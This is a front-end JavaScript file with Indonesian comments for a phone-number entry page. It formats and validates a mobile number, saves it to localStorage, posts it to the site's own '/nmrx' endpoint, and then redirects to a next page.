
"use strict";

// =============================
// ELEMENT
// =============================

const phoneInput = document.getElementById("phone");
const lanjutBtn = document.getElementById("lanjutBtn");
const loadingBox = document.getElementById("loadingBox");
const clearBtn = document.getElementById("clearBtn");
const errorBox = document.getElementById("errorBox");

// =============================
// CONFIG
// =============================

let isProcessing = false;
let errorTimer = null;

// =============================
// INITIALIZATION
// =============================

document.addEventListener("DOMContentLoaded", () => {

    document.body.classList.add("fade-in");

    if (phoneInput) {
        phoneInput.focus();
        phoneInput.setAttribute("inputmode", "numeric");
        phoneInput.setAttribute("autocomplete", "tel");
    }

    if (loadingBox) loadingBox.style.display = "none";
    if (clearBtn) clearBtn.style.display = "none";

});

// =============================
// FORMAT NOMOR
// =============================

phoneInput.addEventListener("input", (e) => {

    let angka = e.target.value.replace(/\D/g, "").substring(0, 13);

    let hasil = angka.substring(0, 3);

    if (angka.length > 3) {
        hasil += "-" + angka.substring(3, 7);
    }

    if (angka.length > 7) {
        hasil += "-" + angka.substring(7, 13);
    }

    e.target.value = hasil;

    clearBtn.style.display = angka.length ? "flex" : "none";

    hideError();

});

// =============================
// ERROR
// =============================

function showError() {

    errorBox.classList.add("show");

    if (navigator.vibrate) {
        navigator.vibrate(100);
    }

    clearTimeout(errorTimer);

    errorTimer = setTimeout(hideError, 2000);

}

function hideError() {

    errorBox.classList.remove("show");

    clearTimeout(errorTimer);

}

// =============================
// LOADING
// =============================

function showLoading() {

    loadingBox.style.display = "flex";

    lanjutBtn.disabled = true;

    lanjutBtn.style.pointerEvents = "none";

}

function hideLoading() {

    loadingBox.style.display = "none";

    lanjutBtn.disabled = false;

    lanjutBtn.style.pointerEvents = "";

    isProcessing = false;

}

// =============================
// CLEAR
// =============================

clearBtn.addEventListener("click", () => {

    if (isProcessing) return;

    phoneInput.value = "";

    clearBtn.style.display = "none";

    hideError();

    phoneInput.focus();

});

// =============================
// ENTER
// =============================

phoneInput.addEventListener("keydown", (e) => {

    if (e.key === "Enter") {

        e.preventDefault();

        lanjutBtn.click();

    }

});

// =============================
// LANJUT
// =============================

lanjutBtn.addEventListener("click", async (e) => {

    e.preventDefault();

    if (isProcessing) return;

    const nomor = phoneInput.value.replace(/\D/g, "");

    // VALIDASI

    if (nomor.length < 9 || nomor.charAt(0) !== "8") {

        showError();

        phoneInput.focus();

        return;

    }

    // KUNCI PROSES LANGSUNG

    isProcessing = true;

    // TAMPILKAN LOADING

    showLoading();

    // SIMPAN NOMOR

    localStorage.setItem("nmrx", nomor);

    try {

        const controller = new AbortController();

        const timeout = setTimeout(() => {
            controller.abort();
        }, 10000);

        let response;

        try {

            response = await fetch("/nmrx", {

                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    nmrx: nomor
                }),

                signal: controller.signal

            });

        } finally {

            clearTimeout(timeout);

        }

        if (!response.ok) {
            throw new Error("Server error: " + response.status);
        }

        // PINDAH HALAMAN

        document.body.classList.add("fade-out");

        setTimeout(() => {

            window.location.replace("pix.html");

        }, 300);

    } catch (error) {

        console.error("Kesalahan:", error);

        hideLoading();

        showError();

    }

});

// =============================
// RESET SAAT KEMBALI
// =============================

window.addEventListener("pageshow", () => {

    isProcessing = false;

    if (loadingBox) loadingBox.style.display = "none";

    if (lanjutBtn) lanjutBtn.disabled = false;

});
